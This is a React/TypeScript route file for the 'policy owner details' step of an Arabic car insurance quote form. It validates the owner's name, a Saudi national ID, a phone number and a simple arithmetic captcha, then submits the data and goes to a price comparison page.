import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { ArrowLeft, RefreshCw, User } from "lucide-react";
import { submitCurrentStep } from "@/lib/workflow";
import { track } from "@/lib/gate";

export const Route = createFileRoute("/owner")({
  head: () => ({
    meta: [
      { title: "بيانات مالك الوثيقة — بيكير" },
      { name: "description", content: "أدخل بيانات مالك الوثيقة لإتمام طلب التأمين." },
      { property: "og:title", content: "بيانات مالك الوثيقة — بيكير" },
      { property: "og:description", content: "أدخل بيانات مالك الوثيقة لإتمام طلب التأمين." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: OwnerPage,
});

function newCaptcha() {
  const a = Math.floor(Math.random() * 8) + 2;
  const b = Math.floor(Math.random() * 8) + 1;
  return { a, b, answer: String(a + b) };
}

function OwnerPage() {
  const navigate = useNavigate();
  const [form, setForm] = useState({
    ownerName: "",
    nationalId: "",
    phone: "",
    captcha: "",
  });
  const [captcha, setCaptcha] = useState(newCaptcha);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [fieldErrors, setFieldErrors] = useState<Record<string, string>>({});

  const update = (k: string, v: string) => {
    setForm((p) => ({ ...p, [k]: v }));
    setFieldErrors((p) => ({ ...p, [k]: "" }));
  };

  const validateNationalId = (v: string) => {
    if (!v.trim()) return "رقم الهوية الوطنية / الإقامة مطلوب";
    return /^[12]\d{9}$/.test(v) ? "" : "رقم الهوية/الإقامة يجب أن يكون 10 أرقام ويبدأ بـ 1 أو 2";
  };
  const validatePhone = (v: string) => {
    if (!v.trim()) return "يرجى إدخال رقم الهاتف";
    return /^05\d{8}$/.test(v) ? "" : "رقم الجوال يجب أن يبدأ بـ 05 ويحتوي على 10 أرقام";
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    const errors: Record<string, string> = {
      ownerName: form.ownerName.trim() ? "" : "الرجاء أدخال الاسم كاملا",
      nationalId: validateNationalId(form.nationalId),
      phone: validatePhone(form.phone),
      captcha:
        !form.captcha.trim()
          ? "يرجى إدخال رمز التحقق"
          : form.captcha.trim() !== captcha.answer
            ? "رمز التحقق غير صحيح"
            : "",
    };
    setFieldErrors(errors);
    if (Object.values(errors).some(Boolean)) {
      if (errors["captcha"]) {
        setCaptcha(newCaptcha());
        setForm((p) => ({ ...p, captcha: "" }));
      }
      return;
    }
    setLoading(true);
    track("submit", { step: "owner" });
    const res = await submitCurrentStep("customer_info", form);
    setLoading(false);
    if (res.success) {
      void navigate({ to: "/compare" });
    } else {
      setError(res.error || "حدث خطأ");
    }
  };

  const err = (k: string) =>
    fieldErrors[k] ? <p className="mt-1 text-xs text-red-600">{fieldErrors[k]}</p> : null;

  return (
    <div className="min-h-screen bg-dark-50 pt-16 md:pt-20">
      <div className="container-x py-8 md:py-12">
        <div className="mx-auto max-w-3xl">
          <div className="mb-6 text-center">
            <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-2xl bg-primary-100 text-primary-600">
              <User className="h-8 w-8" />
            </div>
            <h1 className="mt-4 text-3xl font-extrabold text-dark-900">بيانات مالك الوثيقة</h1>
            <p className="mt-2 text-dark-500">أدخل بيانات مالك الوثيقة لعرض العروض المتاحة</p>
          </div>

          <div className="mb-6 flex flex-wrap justify-center gap-2 md:gap-4">
            {["بيانات التأمين", "بيانات مالك الوثيقة", "قائمة الأسعار", "الملخص والدفع"].map((label, i) => (
              <div key={label} className="flex items-center gap-2">
                <div className={`flex h-8 w-8 items-center justify-center rounded-full text-xs font-bold ${i === 1 ? "bg-primary-600 text-white" : i < 1 ? "bg-primary-100 text-primary-700" : "bg-dark-200 text-dark-500"}`}>
                  {i + 1}
                </div>
                <span className={`text-xs md:text-sm ${i === 1 ? "font-bold text-dark-900" : i < 1 ? "text-primary-700" : "text-dark-400"}`}>{label}</span>
              </div>
            ))}
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="card space-y-5">
              <div className="flex items-center gap-2 border-b border-dark-100 pb-3">
                <User className="h-5 w-5 text-primary-600" />
                <h2 className="text-lg font-bold text-dark-900">بيانات مالك الوثيقة</h2>
              </div>

              <div className="grid grid-cols-1 gap-5 md:grid-cols-2">
                <div className="md:col-span-2">
                  <label className="mb-1.5 block text-sm font-medium text-dark-700">اسم صاحب الوثيقة</label>
                  <input value={form.ownerName} onChange={(e) => update("ownerName", e.target.value)} className="input-field" placeholder="الاسم كما في الهوية" />
                  {err("ownerName")}
                </div>
                <div>
                  <label className="mb-1.5 block text-sm font-medium text-dark-700">رقم الهوية الوطنية / الإقامة</label>
                  <input value={form.nationalId} onChange={(e) => update("nationalId", e.target.value.replace(/\D/g, "").slice(0, 10))} onBlur={() => form.nationalId && setFieldErrors((p) => ({ ...p, nationalId: validateNationalId(form.nationalId) }))} className="input-field" placeholder="أكتب رقم الهوية الوطنية / الإقامة هنا" inputMode="numeric" maxLength={10} dir="ltr" />
                  {err("nationalId")}
                </div>
                <div>
                  <label className="mb-1.5 block text-sm font-medium text-dark-700">رقم الجوال</label>
                  <input value={form.phone} onChange={(e) => update("phone", e.target.value.replace(/\D/g, "").slice(0, 10))} onBlur={() => form.phone && setFieldErrors((p) => ({ ...p, phone: validatePhone(form.phone) }))} className="input-field" placeholder="05xxxxxxxx" inputMode="numeric" maxLength={10} dir="ltr" />
                  {err("phone")}
                </div>
                <div className="md:col-span-2">
                  <label className="mb-1.5 block text-sm font-medium text-dark-700">رمز التحقق</label>
                  <div className="flex items-center gap-3">
                    <div className="flex items-center gap-2 rounded-xl bg-dark-100 px-4 py-3 font-mono text-lg font-bold tracking-widest text-dark-800" dir="ltr">
                      {captcha.a} + {captcha.b} = ?
                      <button type="button" onClick={() => { setCaptcha(newCaptcha()); update("captcha", ""); }} className="text-dark-400 hover:text-primary-600" aria-label="تحديث رمز التحقق">
                        <RefreshCw className="h-4 w-4" />
                      </button>
                    </div>
                    <input value={form.captcha} onChange={(e) => update("captcha", e.target.value.replace(/\D/g, "").slice(0, 2))} className="input-field w-28 text-center" placeholder="الناتج" inputMode="numeric" dir="ltr" />
                  </div>
                  {err("captcha")}
                </div>
              </div>
            </div>

            {error && <p className="rounded-lg bg-red-50 px-4 py-2 text-sm text-red-600">{error}</p>}

            <button type="submit" disabled={loading} className="btn-primary w-full disabled:opacity-60">
              {loading ? "جاري عرض الأسعار..." : "عرض العروض المتاحة"}
              <ArrowLeft className="h-5 w-5" />
            </button>
          </form>
        </div>
      </div>
    </div>
  );
}
